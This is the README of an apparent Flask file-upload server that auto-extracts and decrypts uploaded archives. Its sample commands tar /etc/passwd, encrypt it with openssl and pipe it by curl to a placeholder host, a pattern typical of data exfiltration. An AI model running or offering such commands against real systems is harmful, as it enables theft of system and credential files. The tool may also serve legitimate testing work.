# HTTP Server Script

This script provides a way to upload and download files on a server using Flask. It offers features such as automatic extraction of uploaded ZIP and TAR files, optional automatic decryption of encrypted tar file, and download capabilities.  

## Prerequisites

- Python 3.x
- Flask
- Cryptodome
- Werkzeug

## Setup

1. Use pip to install the prerequisites  
2. Modify the configuration variables in the script:

- `mypwd`: Change this to your decryption password.
- `app.config['UPLOAD_DIR']`: Set the path to the directory where uploaded files will be stored.
- `app.config['DOWNLOAD_DIR']`: Set the path to the directory where downloaded files will be stored.
- `app.config['AUTO_EXTRACT']`: Set to `True` to enable automatic extraction of ZIP and TAR files.
- `app.config['AUTO_DECRYPT']`: Set to `True` to enable automatic decryption of encrypted files.
- `app.run(host='0.0.0.0', port=80)` Change port and host as needed.

## Notes

- Ensure that you have the necessary permissions for the upload and download directories.
- This script is intended for educational purposes and can be extended for production use with additional security measures.
- Keep your decryption password (`mypwd`) secure and do not share it.

## Sample Commands
Auto decryption of tar and extract

    tar c /etc/passwd | openssl enc -md sha256 -aes-256-cbc -pbkdf2 -e -a -pass 'pass:password' | curl http://ipaddr:port/?enc=1 -F 'file=@-'

Create tar file or zip and upload

    tar -cvf sample.tar /etc/passwd | curl -F 'file=@sample.tar' http://ipaddr:port/
    
## License

This script is released under the [MIT License](LICENSE).